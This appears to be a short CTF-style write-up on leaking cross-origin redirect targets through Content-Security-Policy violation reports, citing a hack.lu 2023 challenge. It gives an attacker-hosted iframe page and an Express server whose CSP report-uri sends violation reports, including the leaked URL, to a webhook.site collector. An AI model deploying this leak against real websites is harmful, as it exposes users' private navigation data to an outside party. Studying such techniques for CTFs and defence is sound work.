# CSP Violation

Csp violations could be used to leak sensitive information from a website.

A best example is shown in paaad challenge from hack.lu23.

An example is https://xn--pd-viaaa.space/ redirects to another url lets say http://x.com, now lets say that we're hosting a page with the following html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>csp violations</title>
</head>
<body>
    <iframe src="https://xn--pd-viaaa.space/p/latest" frameborder="0"></iframe>
</body>
</html>
```

and lets say the server has the following code

```js
const express = require('express');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000; // Use port 3000 or a provided environment variable

// Serve the index.html file when visiting the root path '/'
app.get('/', (req, res) => {
    res.set('Content-Security-Policy', "frame-src https://xn--pd-viaaa.space/p latest; report-uri https://webhook.site/77ae34c3-9267-462b-a55f-7dac21fb9a36");
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

```

As we can see CSP is being set frame-src as https://xn--pd-viaaa.space/p/latest but in the html we are setting the source of the frame as the same ie https://xn--pd-viaaa.space/p/latest but we know that it'll redirect to http://x.com so that causes a csp violation, and will trigger an error in the console we can use the csp
report-uri to send a port request to our server hence leaking info,such as http://x.com which the user was supposed to go after typing in a paaad in the challenge.

# CSP and Server Side redirects

If csp is set to http://example.com, and on visiting http://example.com we're redirected to http://image.example.com then the CSP is violated and a CSP violation is produced which can captured via ``report-uri``.

If it is redirected to http://example.com/image then that is allowed by the CSP, if the redirect is a server side redirect.